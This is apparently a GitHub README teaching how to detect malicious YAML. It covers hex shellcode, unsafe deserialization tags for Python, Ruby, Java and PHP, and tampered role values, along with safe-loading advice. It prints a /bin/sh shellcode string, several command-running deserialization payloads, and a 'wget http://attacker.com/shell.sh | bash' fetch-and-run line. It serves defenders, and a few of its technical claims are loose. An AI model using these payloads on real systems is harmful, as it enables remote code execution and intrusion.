# YAML-Security-Detecting-Malicious-Manipulation
A comprehensive guide to detecting malicious manipulation in YAML files — from obvious binary payloads to sneaky deserialization attacks.

📌 Why This Repository?
YAML (Yet Another Markup Language) is designed to be human-readable. When you open a YAML file, you should see plain text — letters, numbers, punctuation.

But sometimes, attackers inject malicious code into YAML files. This can happen in two ways:

Brute force injection: Binary code, shellcode, or hex payloads like \x91, \x90, \x41

Sneaky manipulation: Language-specific tags that execute system commands during deserialization

This repository helps you identify both.

🎯 What You'll Learn
How to spot hex codes (\x91, \x90, etc.) in YAML files

Why these hex codes indicate binary/shellcode injection attempts

What Insecure Deserialization is and why it's more dangerous

How attackers use language-specific tags (Python, Ruby, Java) to achieve RCE

Real-world examples of YAML-based attacks

Detection rules and prevention tips

1️⃣ Hex Codes in YAML: \x91, \x90, \x41 — What Do They Mean?
YAML files should contain readable text. If you see something like this:

yaml
name: "John"
data: "\x91\xEB\x90\x41\x90\x90"
That's a red flag. 🚩

These \x.. sequences represent hexadecimal values — binary data disguised as text. Attackers use them to:

Inject shellcode into YAML

Trigger buffer overflows in applications that parse YAML unsafely

Execute arbitrary code on the target system

Example:
yaml
payload: "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
This is not normal YAML. It's shellcode waiting to be executed.

2️⃣ The Real Danger: Insecure Deserialization
Hex codes are easy to spot. But sophisticated attackers don't need them.

They use Insecure Deserialization — a vulnerability where YAML parsers automatically create objects from untrusted data.

How it works:
Many programming languages (Python, Ruby, Java, PHP) have YAML libraries that support custom tags (like !!python/object/apply). These tags tell the parser: "Hey, create this object and run this command."

Example (Python-based system):
yaml
!!python/object/apply:os.system ["cat /etc/passwd"]
No hex codes. No weird characters. Just a clean YAML line that:

Calls os.system

Executes cat /etc/passwd

Sends system passwords to the attacker

This is Remote Code Execution (RCE) — and it's completely invisible to casual inspection.

More examples:
Language	Malicious Tag Example
Python	!!python/object/apply:subprocess.check_output ["ls -la"]
Ruby	!ruby/object:Kernel.system "id"
Java	!!javax.script.ScriptEngineManager [ "js", "java.lang.Runtime.getRuntime().exec('calc')" ]
PHP	!php/object "O:8:"Example":0:{}"
3️⃣ What to Look For When Analyzing YAML Files
If you're investigating a suspicious YAML file, check for:

🔴 Red Flags (Obvious)
Hex codes like \x91, \x90, \x41, \xEB, etc.

Long strings of unreadable characters

Binary-like data in text fields

🔥 Red Flags (Sneaky — Deserialization Attacks)
Tags starting with !! followed by language names:

!!python/...

!!ruby/...

!!java/..., !!javax/...

!php/...

Unusual object creation commands

System command execution attempts (os.system, subprocess, Runtime.exec, Kernel.system)

⚠️ Logic Manipulation (Simple but Effective)
Sometimes attackers don't inject code — they just change a value:

yaml
admin: false   →   admin: true
Or:

yaml
role: "user"   →   role: "admin"
These changes can bypass authentication or escalate privileges without any "malicious" code.

4️⃣ Real-World Attack Scenarios
Scenario 1: Hex Injection (Noisy)
An attacker tries to overflow a buffer:

yaml
exploit: "\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
Detection: Easy — hex codes stand out.

Scenario 2: Deserialization Attack (Silent)
An attacker sends a YAML file to a Python web app:

yaml
user_input: !!python/object/apply:os.system ["wget http://attacker.com/shell.sh | bash"]
Detection: Requires understanding of YAML tags and deserialization risks.

Scenario 3: Privilege Escalation
yaml
user:
  name: "john"
  role: "admin"  # was "user"
Detection: Compare with known-good versions.

5️⃣ How to Prevent YAML-Based Attacks
✅ Do's
Never load YAML from untrusted sources with yaml.load() (Python) or similar unsafe methods

Use safe loaders:

Python: yaml.safe_load()

Ruby: YAML.safe_load

Java: Use libraries that disable object deserialization

Validate and sanitize all YAML input

Use schema validation to enforce expected structure

Monitor for unusual tags (!!python, !!ruby, etc.)

❌ Don'ts
Don't use !! tags unless absolutely necessary

Don't trust YAML from users, APIs, or external sources

Don't ignore hex codes in text fields

📂 Repository Structure
File/Folder	Description
README.md	This guide
examples/	Real-world malicious YAML examples
detection-rules/	YARA rules, Sigma rules for YAML threats
prevention/	Code snippets for safe YAML parsing
cheatsheet.md	Quick reference for spotting attacks
📚 Resources
OWASP: Deserialization Cheat Sheet

CWE-502: Deserialization of Untrusted Data

Python PyYAML Documentation

Ruby YAML Safe Loading

👨‍💻 Contributing
Found a new YAML attack technique? Want to add examples or detection rules? PRs welcome!

📬 Contact
LinkedIn: https://www.linkedin.com/in/semih-sar%C4%B1-330858338/

GitHub: https://github.com/zerodayhunter543


If this repository helps you, please give it a star. It helps others find it too.

YAML looks innocent. But inside, it might be plotting against you. 🛡️
